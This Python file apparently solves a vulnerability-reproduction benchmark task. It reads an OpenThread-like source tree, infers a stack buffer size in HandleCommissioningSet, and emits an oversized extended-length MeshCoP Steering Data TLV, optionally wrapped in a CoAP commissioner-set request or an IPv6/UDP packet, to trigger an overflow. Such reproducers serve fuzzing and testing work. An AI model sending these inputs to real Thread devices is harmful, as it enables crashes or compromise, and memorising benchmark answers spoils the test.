import os
import re
import tarfile
import ast
from typing import Dict, Iterable, Iterator, List, Optional, Tuple


_TEXT_EXTS = {
    ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc", ".inl", ".ipp", ".tcc", ".S", ".s"
}


def _is_probably_text(b: bytes) -> bool:
    if not b:
        return True
    if b"\x00" in b:
        return False
    # Heuristic: allow mostly printable/whitespace bytes
    sample = b[:4096]
    bad = 0
    for ch in sample:
        if ch in (9, 10, 13):
            continue
        if 32 <= ch <= 126:
            continue
        bad += 1
    return bad <= max(8, len(sample) // 20)


def _iter_source_files_from_dir(root: str, max_size: int = 2_000_000) -> Iterator[Tuple[str, str]]:
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            ext = os.path.splitext(fn)[1]
            if ext not in _TEXT_EXTS:
                continue
            path = os.path.join(dirpath, fn)
            try:
                st = os.stat(path)
            except OSError:
                continue
            if st.st_size > max_size:
                continue
            try:
                with open(path, "rb") as f:
                    data = f.read()
            except OSError:
                continue
            if not _is_probably_text(data):
                continue
            try:
                text = data.decode("utf-8", errors="ignore")
            except Exception:
                text = data.decode("latin-1", errors="ignore")
            rel = os.path.relpath(path, root)
            yield rel, text


def _iter_source_files_from_tar(tar_path: str, max_size: int = 2_000_000) -> Iterator[Tuple[str, str]]:
    with tarfile.open(tar_path, "r:*") as tf:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            ext = os.path.splitext(m.name)[1]
            if ext not in _TEXT_EXTS:
                continue
            if m.size <= 0 or m.size > max_size:
                continue
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
            except Exception:
                continue
            if not _is_probably_text(data):
                continue
            try:
                text = data.decode("utf-8", errors="ignore")
            except Exception:
                text = data.decode("latin-1", errors="ignore")
            yield m.name, text


def _iter_source_files(src_path: str) -> Iterator[Tuple[str, str]]:
    if os.path.isdir(src_path):
        yield from _iter_source_files_from_dir(src_path)
    else:
        yield from _iter_source_files_from_tar(src_path)


_DEFINE_RE = re.compile(r"(?m)^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*(?:/[*].*?[*]/\s*)?(?://.*)?$")
_ENUM_ASSIGN_RE = re.compile(r"\b([A-Za-z_]\w*)\s*=\s*(0x[0-9A-Fa-f]+|\d+)\b")
_CONSTEXPR_RE = re.compile(r"\b(?:static\s+)?(?:const|constexpr)\s+(?:u?int(?:8|16|32|64)_t|unsigned|int|size_t)\s+([A-Za-z_]\w*)\s*=\s*([^;]+);")


def _strip_c_suffixes(expr: str) -> str:
    expr = re.sub(r"(?i)\b(0x[0-9a-f]+|\d+)\s*(u|ul|ull|l|ll)\b", r"\1", expr)
    return expr


def _strip_casts(expr: str) -> str:
    prev = None
    s = expr
    for _ in range(8):
        prev = s
        s = re.sub(r"static_cast<[^>]+>\s*\(\s*([^)]+?)\s*\)", r"(\1)", s)
        s = re.sub(r"\(\s*(?:u?int(?:8|16|32|64)_t|unsigned|int|size_t)\s*\)\s*", "", s)
        if s == prev:
            break
    return s


_ALLOWED_AST_NODES = (
    ast.Expression,
    ast.BinOp,
    ast.UnaryOp,
    ast.Constant,
    ast.Num,
    ast.Add,
    ast.Sub,
    ast.Mult,
    ast.Div,
    ast.FloorDiv,
    ast.Mod,
    ast.LShift,
    ast.RShift,
    ast.BitOr,
    ast.BitAnd,
    ast.BitXor,
    ast.Invert,
    ast.UAdd,
    ast.USub,
    ast.ParenExpr if hasattr(ast, "ParenExpr") else ast.AST,
)


def _safe_eval_expr(expr: str, consts: Dict[str, int]) -> Optional[int]:
    s = expr.strip()
    if not s:
        return None
    s = s.split("//", 1)[0].strip()
    s = s.split("/*", 1)[0].strip()
    s = _strip_casts(_strip_c_suffixes(s))
    # Remove C++ scope and template fragments
    s = re.sub(r"\b[A-Za-z_]\w*::", "", s)
    s = re.sub(r"<[^<>]*>", "", s)
    # Remove sizeof(...) since we can't evaluate without types; treat as 0
    s = re.sub(r"\bsizeof\s*\([^)]*\)", "0", s)
    # Replace identifiers with values (unknown => 0)
    def repl(m: re.Match) -> str:
        name = m.group(0)
        if name in consts:
            return str(consts[name])
        return "0"
    s = re.sub(r"\b[A-Za-z_]\w*\b", repl, s)
    s = re.sub(r"\s+", "", s)
    if not s:
        return None
    try:
        node = ast.parse(s, mode="eval")
    except Exception:
        return None

    def check(n: ast.AST) -> bool:
        if not isinstance(n, _ALLOWED_AST_NODES):
            return False
        for ch in ast.iter_child_nodes(n):
            if not check(ch):
                return False
        return True

    if not check(node):
        return None

    try:
        val = eval(compile(node, "<expr>", "eval"), {"__builtins__": {}}, {})
    except Exception:
        return None
    if isinstance(val, bool):
        return int(val)
    if not isinstance(val, int):
        try:
            val = int(val)
        except Exception:
            return None
    return val


def _collect_constants(all_texts: List[Tuple[str, str]]) -> Dict[str, int]:
    consts: Dict[str, int] = {}

    for _, text in all_texts:
        for m in _DEFINE_RE.finditer(text):
            name = m.group(1)
            expr = m.group(2).strip()
            val = _safe_eval_expr(expr, consts)
            if val is not None:
                consts.setdefault(name, val)

        for m in _CONSTEXPR_RE.finditer(text):
            name = m.group(1)
            expr = m.group(2)
            val = _safe_eval_expr(expr, consts)
            if val is not None:
                consts.setdefault(name, val)

        # Common enums: extract numeric assignments
        for m in _ENUM_ASSIGN_RE.finditer(text):
            name = m.group(1)
            num = m.group(2)
            try:
                val = int(num, 0)
            except Exception:
                continue
            consts.setdefault(name, val)

    return consts


def _extract_function_body(text: str, func_name: str) -> Optional[str]:
    idx = text.find(func_name)
    if idx < 0:
        return None
    # Find opening brace after func name
    brace = text.find("{", idx)
    if brace < 0:
        return None
    i = brace
    depth = 0
    n = len(text)
    while i < n:
        ch = text[i]
        if ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                return text[brace:i + 1]
        i += 1
    return None


_ARRAY_DECL_RE = re.compile(r"\b(?:uint8_t|char|uint16_t|uint32_t|uint64_t|int|unsigned)\s+([A-Za-z_]\w*)\s*\[\s*([^\]]+)\s*\]")


def _infer_stack_buffer_size(handle_text: Optional[str], consts: Dict[str, int]) -> Optional[int]:
    candidates: List[int] = []

    if handle_text:
        body = _extract_function_body(handle_text, "HandleCommissioningSet")
        if body:
            for m in _ARRAY_DECL_RE.finditer(body):
                var = m.group(1)
                expr = m.group(2)
                if not any(k in var.lower() for k in ("tlv", "dataset", "commission", "data", "buffer", "buf")):
                    continue
                val = _safe_eval_expr(expr, consts)
                if val is not None and 0 < val < 1_000_000:
                    candidates.append(val)

    # Also look for related constants
    for k, v in consts.items():
        lk = k.lower()
        if any(x in lk for x in ("commissioner", "commissioning")) and any(x in lk for x in ("dataset", "tlv", "data")) and any(x in lk for x in ("max", "length", "size")):
            if 0 < v < 1_000_000:
                candidates.append(v)

    if not candidates:
        return None

    # Prefer likely stack sizes: 256/512/1024 etc or values in that range
    candidates = sorted(set(candidates))
    for preferred in (256, 255, 512, 1024, 2048):
        if preferred in candidates:
            return preferred
    # Otherwise, take smallest >= 200
    for v in candidates:
        if v >= 200:
            return v
    return candidates[0]


def _get_const(consts: Dict[str, int], names: List[str], default: int) -> int:
    for n in names:
        if n in consts:
            return int(consts[n]) & 0xFF
    return default & 0xFF


def _detect_input_format(fuzzer_texts: List[Tuple[str, str]]) -> str:
    # Returns "TLV", "COAP", or "IPV6"
    chosen = None
    for name, text in fuzzer_texts:
        lt = text.lower()
        if "commission" in lt or "c/cs" in lt or "commissioningset" in lt:
            chosen = (name, text)
            break
    if chosen is None and fuzzer_texts:
        chosen = fuzzer_texts[0]
    if chosen is None:
        return "TLV"

    text = chosen[1]
    lt = text.lower()

    if "llvmfuzzertestoneinput" not in lt:
        return "TLV"

    # Heuristics
    if "ip6::header" in text or "ipv6" in lt or "udp::header" in text or "icmp6" in lt:
        return "IPV6"

    if "coap::message" in text or "coap message" in lt or "otcoap" in lt:
        # If fuzzer constructs request and appends fuzz bytes to payload, input is TLV/payload
        if ".appendbytes" in lt or "appendbytes(" in lt or "setpayloadmarker" in lt:
            return "TLV"
        # If it parses from bytes, treat as COAP
        if "parse" in lt and ("data" in lt or "aData" in text):
            return "COAP"
        if "frombytes" in lt or "decode" in lt:
            return "COAP"
        # default for coap fuzzers tends to be payload
        return "TLV"

    # If we see it building messages and appending fuzz bytes
    if ".appendbytes" in lt or "appendbytes(" in lt:
        return "TLV"

    return "TLV"


def _build_meshcop_tlv(t: int, val: bytes) -> bytes:
    l = len(val)
    if l <= 254:
        return bytes([t & 0xFF, l & 0xFF]) + val
    if l <= 0xFFFF:
        return bytes([t & 0xFF, 0xFF]) + l.to_bytes(2, "big") + val
    raise ValueError("TLV too large")


def _build_meshcop_tlv_extended(t: int, ext_len: int, fill_byte: int = 0x41) -> bytes:
    if not (0 <= ext_len <= 0xFFFF):
        raise ValueError("ext_len out of range")
    return bytes([t & 0xFF, 0xFF]) + ext_len.to_bytes(2, "big") + bytes([fill_byte & 0xFF]) * ext_len


def _build_coap_commissioner_set(payload: bytes) -> bytes:
    # CoAP POST to Uri-Path "c"/"cs" with no token, message id 0x1234.
    hdr = bytes([0x40, 0x02, 0x12, 0x34])
    # Option: Uri-Path (11) "c"
    opt1 = bytes([0xB1, 0x63])
    # Option: Uri-Path (11) "cs" (delta 0 from previous option number 11)
    opt2 = bytes([0x02, 0x63, 0x73])
    return hdr + opt1 + opt2 + b"\xFF" + payload


def _udp_checksum_ipv6(src: bytes, dst: bytes, udp_hdr_wo_checksum: bytes, payload: bytes, next_header: int = 17) -> int:
    def sum16(data: bytes) -> int:
        if len(data) % 2:
            data += b"\x00"
        s = 0
        for i in range(0, len(data), 2):
            s += (data[i] << 8) | data[i + 1]
        return s

    udp_len = len(udp_hdr_wo_checksum) + len(payload)
    pseudo = src + dst + udp_len.to_bytes(4, "big") + b"\x00" * 3 + bytes([next_header & 0xFF])
    s = sum16(pseudo) + sum16(udp_hdr_wo_checksum) + sum16(payload)
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    csum = (~s) & 0xFFFF
    return csum if csum != 0 else 0xFFFF


def _build_ipv6_udp_packet(udp_payload: bytes, src_port: int = 5683, dst_port: int = 5683) -> bytes:
    src = bytes.fromhex("fe800000000000000000000000000001")
    dst = bytes.fromhex("fe800000000000000000000000000002")
    udp_len = 8 + len(udp_payload)

    # IPv6 header
    ver_tc_fl = b"\x60\x00\x00\x00"
    payload_len = udp_len.to_bytes(2, "big")
    next_header = bytes([17])
    hop_limit = bytes([64])
    ip6 = ver_tc_fl + payload_len + next_header + hop_limit + src + dst

    # UDP header
    sp = int(src_port) & 0xFFFF
    dp = int(dst_port) & 0xFFFF
    udp_hdr = sp.to_bytes(2, "big") + dp.to_bytes(2, "big") + udp_len.to_bytes(2, "big") + b"\x00\x00"
    csum = _udp_checksum_ipv6(src, dst, udp_hdr, udp_payload, 17)
    udp_hdr = udp_hdr[:6] + csum.to_bytes(2, "big")
    return ip6 + udp_hdr + udp_payload


class Solution:
    def solve(self, src_path: str) -> bytes:
        all_texts: List[Tuple[str, str]] = []
        fuzzer_texts: List[Tuple[str, str]] = []
        handle_text: Optional[str] = None

        for name, text in _iter_source_files(src_path):
            all_texts.append((name, text))
            lt = text.lower()
            if "llvmfuzzertestoneinput" in lt:
                fuzzer_texts.append((name, text))
            if handle_text is None and "HandleCommissioningSet" in text:
                handle_text = text

        consts = _collect_constants(all_texts)

        fmt = _detect_input_format(fuzzer_texts)

        ext_marker = 0xFF
        if "kExtendedLength" in consts:
            ext_marker = int(consts["kExtendedLength"]) & 0xFF

        tlv_session = _get_const(
            consts,
            ["kCommissionerSessionId", "kCommissionerSessionIdTlv", "kCommissionerSessionIdType"],
            11,
        )
        tlv_steering = _get_const(
            consts,
            ["kSteeringData", "kSteeringDataTlv", "kSteeringDataType"],
            8,
        )

        # Infer stack buffer length likely used for accumulating TLVs, choose minimal symmetric extended length >= buffer+1.
        buf_sz = _infer_stack_buffer_size(handle_text, consts)
        if buf_sz is None:
            buf_sz = 256
        need = int(buf_sz) + 1
        if need < 257:
            need = 257
        # choose endian-agnostic length: 0xkkkk for some k (len = 257*k)
        k = (need + 256) // 257
        if k < 1:
            k = 1
        if k > 255:
            k = 255
        ext_len = (k << 8) | k

        # Build TLV payload
        session_val = b"\x00\x00"
        session_tlv = bytes([tlv_session & 0xFF, len(session_val) & 0xFF]) + session_val
        # Malicious TLV: length marker must be extended
        if ext_marker != 0xFF:
            # If marker differs, still force 0xFF in length byte to exercise the bug (fixed version should reject it).
            ext_marker = 0xFF
        evil_tlv = bytes([tlv_steering & 0xFF, ext_marker]) + ext_len.to_bytes(2, "big") + (b"A" * ext_len)

        payload = session_tlv + evil_tlv

        if fmt == "COAP":
            return _build_coap_commissioner_set(payload)
        if fmt == "IPV6":
            coap = _build_coap_commissioner_set(payload)
            return _build_ipv6_udp_packet(coap, 5683, 5683)
        return payload